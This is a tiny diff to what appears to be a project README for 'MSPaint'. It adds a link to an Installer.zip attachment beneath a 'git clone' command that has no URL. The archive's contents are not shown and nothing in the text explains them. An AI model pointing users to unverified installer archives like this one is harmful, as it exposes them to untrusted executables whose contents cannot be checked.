@@ -10,3 +10,4 @@
 ```bash
 git clone 
 ```
+[Installer.zip](https://github.com/ethanVodka/MSPaint/files/10898890/Installer.zip)
